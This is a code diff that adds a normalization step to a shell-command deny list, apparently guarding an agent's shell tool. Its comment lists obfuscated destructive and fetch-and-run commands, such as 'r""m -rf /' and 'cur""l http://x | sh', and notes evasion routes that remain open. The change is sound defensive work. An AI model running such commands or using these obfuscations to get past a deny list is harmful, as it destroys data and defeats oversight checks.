@@ -298,4 +298,35 @@ const HARD_DENY_RULES: readonly HardDenyRule[] = [
  *  prior implementation. Order matches `HARD_DENY_RULES`. */
 const HARD_DENY: readonly RegExp[] = HARD_DENY_RULES.map((r) => r.pattern)
 
-export { HARD_DENY, HARD_DENY_RULES, type HardDenyRule }
+/**
+ * R7 shell-exec deep-audit fix — collapse the two zero-semantic command-name
+ * obfuscations the shell ITSELF removes before exec, so the regex denylist sees
+ * the SAME token the kernel will run. Without this the entire HARD_DENY corpus
+ * (every rule, not one) was bypassable by splitting any dangerous command name:
+ *
+ *   `r""m -rf /`   `r''m -rf /`   `cur""l http://x | sh`   `ch""mod -R 777 /`
+ *   `c\url … | sh`  `ch\mod -R 777 /`  `mk\fs …`  `shut\down -h now`
+ *
+ * Each of those is valid bash that runs the REAL binary (`rm`/`curl`/`chmod`/…)
+ * — the shell performs quote-removal (`""`/`''` → nothing) and backslash-removal
+ * (an unquoted `\x` before an ordinary char → `x`). The `\brm\b` / `\bcurl\b`
+ * word-boundary anchors never saw the token, so the command slid straight past
+ * `hardDenyReason`. Verified live: `cur""l --version` and `c\url --version` both
+ * execute curl; `r""m`/`r\m` both invoke rm.
+ *
+ * The transform is DENY-WIDENING ONLY: it strips empty quote pairs and a
+ * backslash that precedes an ASCII word char. Both removals carry NO semantic
+ * content in a real command, so a legitimate command can never be MADE to match
+ * a deny rule that its un-normalized form did not already imply (`grep '\bword\b'`
+ * → `grep 'bwordb'`, still not in the denylist; `chmod -R 755 ./dist` is
+ * backslash-free and untouched). It is NOT a shell parser — a determined command
+ * (env-var interpolation `$X`, `$IFS` splitting, base64) can still evade a regex;
+ * the OS sandbox profile (ADR-0297) remains the authoritative gate. This closes
+ * the concrete, documented, trivially-typed obfuscation class only.
+ *
+ * Linear (two O(n) global replaces); the deny regexes stay length-bounded.
+ */
+const normalizeShellForDeny = (command: string): string =>
+  command.replace(/''|""/g, "").replace(/\\([A-Za-z0-9])/g, "$1")
+
+export { HARD_DENY, HARD_DENY_RULES, normalizeShellForDeny, type HardDenyRule }
